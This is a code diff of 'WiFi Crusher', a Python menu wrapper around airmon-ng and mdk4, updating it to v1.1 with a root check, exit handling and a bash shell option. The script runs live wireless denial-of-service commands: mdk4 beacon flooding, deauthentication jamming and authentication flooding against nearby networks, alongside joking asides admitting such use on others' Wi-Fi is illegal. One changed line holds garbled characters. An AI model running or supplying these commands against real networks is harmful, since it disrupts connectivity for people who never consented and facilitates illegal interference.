@@ -7,20 +7,22 @@ import string
 import subprocess
 import sys
 from getpass import getpass
-import webbrowser
+import pwd
 
 chars = string.ascii_letters + string.digits + '!@#$%^*()'
 random.seed(os.urandom(1024))
 ByeList = ["Poka", "Sayonara", "Adios", "Goodbye", "Hasta La Vista", "Alividercci", "Do pobachennya", "Auf Wiedersehen", "Zaijian"]
-random_stream = ["https://soundcloud.com/uamee", "https://soundcloud.com/djblyatman", "https://soundcloud.com/gopnikmcblyat"]
 clear = "clear"
 QuoteList = ["Ok, so what? Is that all? No, I think I screwed your WiFi :3 See ya later :D", "Don't attempt to use it on another person's WiFi, cuz' it's really illegal and stupid", "GNU comes with ABSOLUTLEY NO WARRANTY, to the extent pemitted by applicable law.", "Use your electronics smartly, so you won't get to jail for that thing :D", "I don't think that WiFi Crusher won't kill my WiFi, but I don't think so!", "This is really pity, don't you think?", "i aM gOInG t0 h4Ck Ur Internet(typical script kiddie)", "I suggest use this tool to troll Tech Support scammers)", "Try poking around, see if you find something.", "I tried making my own tool, but I made an overlay for MDK4.", "Simply put, code for MAC addresses doesn't work.", "Thank you, aircrack-ng team for making fantastic tools. I wrote WiFi Crusher in two weeks.", "Hey, stop the music, or I'll kill your WiFi!"]
 mac_list = ["A", "B", "C", "D", "E", "F"]
 def main():
-	os.system("airmon-ng start wlan0")
-	os.system(clear)
-	menu()
-	choice_logic()
+	try:
+		os.system("airmon-ng start wlan0")
+		os.system(clear)
+		menu()
+		choice_logic()
+	except KeyboardInterrupt:
+		exit_state()
 
 def menu():
 	os.system(clear)
@@ -29,7 +31,7 @@ def menu():
       |  /|  / / /     /  /     / |  /   / /     /   /  /    / |
       | / | / / /---- /  /     /--- /   / /__   /---/  /--- /---
       |/  |/ / /     /  /___  /  | /___/  ___/ /   /  /___ /|
-                                v1.0 
+                                v1.1 
    	https://github.com/inquisition-musician/wifi_crusher
    	    https://github.com/aircrack-ng/aircrack-ng
    	       https://github.com/aircrack-ng/mdk4
@@ -59,7 +61,7 @@ def choice_logic():
 	elif choice == "4":
 		authdos()
 		choice_logic()
-	elif choice == "99":
+	elif choice == "99" or choice == "exit":
 		exit_state()
 	elif choice == "r" or choice == "R":
 		menu()
@@ -79,7 +81,7 @@ def choice_logic():
 	elif choice == "a" or choice == "A":
 		about()
 	elif choice == "frdbg":
-		print("OK, this is for debugging purposes.")
+		frdbg()
 	elif choice == "InitialD" or choice == "initiald" or choice == "initialD" or choice == "Initiald":
 		RunInThe90()
 	elif choice == "bigboobs":
@@ -96,6 +98,11 @@ def choice_logic():
 	else:
 		print("Type 'help' to get instructions, or pick 'R' to reload screen")
 		choice_logic()
+	try:
+		choice_logic()
+	except KeyboardInterrupt:
+		print("Type in \"99\", or \"exit\" to quit the program")
+		choice_logic()
 
 def wifi_spammer():
 	os.system("mdk4 wlan0mon b -m -s 500")
@@ -104,6 +111,7 @@ def wifi_jammer():
 	os.system("mdk4 wlan0mon f -s abp -m bmstm -p 4000")
 	choice_logic()
 def exit_state():
+	os.system("airmon-ng stop wlan0mon")
 	os.system(clear)
 	print(random.choice(ByeList) + "!")
 	exit()
@@ -121,7 +129,7 @@ inquisition-musician(i hAvE tHAt NICKnaME!! gIVe IT back u sTiLEr!)
 """)
 	choice = getpass("Press any key to continue! ")
 	if choice == "frdbg":
-		print("OK, this is for debugging purposes.")
+		frdbg()
 	else:
 		menu()
 		choice_logic()
@@ -143,6 +151,10 @@ Funnily enough, you found this easter egg.
 	else:
 		menu()
 		choice_logic()
+
+def frdbg():
+	os.system("airmon-ng stop wlan0mon")
+	print("OK, this is for debugging purposes.")
 
 def helpmenu():
 	print("""
@@ -173,7 +185,7 @@ sounds, but it's GNU, it's free to take a look under the hood.
 	choice_logic()
 
 def boobs():
-	print(""" （•_ㅅ_•） 
+	print(""" ï¼ˆâ€¢_ã……_â€¢ï¼‰ 
 		""")
 	choice = getpass("Press and enter any key to continue! ")
 	if choice == "frdbg":
@@ -185,12 +197,8 @@ def authdos():
 	os.system("mdk4 wlan0mon a -m -s 1000")
 
 def shell():
-	shell_commands = input("$ ")
-	os.system(shell_commands)
-	if shell_commands == "exit":
-		choice_logic()
-	shell()
-	choice_logic()
+	os.system("/usr/bin/bash")
+
 
 def rapid7hello():
 	print("""Shout-out to Rapid7 for inspiring me to make a metasploit-framework-
@@ -211,7 +219,7 @@ inquisition-musician.
 	choice_logic()
 
 def lscriptandfsociety():
-	print("""Shout-out to Manisso and Arios Mela Chronios for another inspiration for making this tool. 
+	print("""Shout-out to Manisso and Aris Mela Chroinos for another inspiration for making this tool. 
 I used your python and shell scripts back, when I was a green Linux user, using Termux. 
 I want to thank you for that. Be safe, and don't use ATM's with skimmers. 
 
@@ -242,5 +250,11 @@ def checkdep():
 		menu()
 		choice_logic()
 
-checkdep()
-main()
+def checkroot():
+	if pwd.getpwuid(os.geteuid()).pw_gecos != "root":
+		print("Run as root, or use \"sudo\" command")
+	else:
+		checkdep()
+		main()
+
+checkroot()
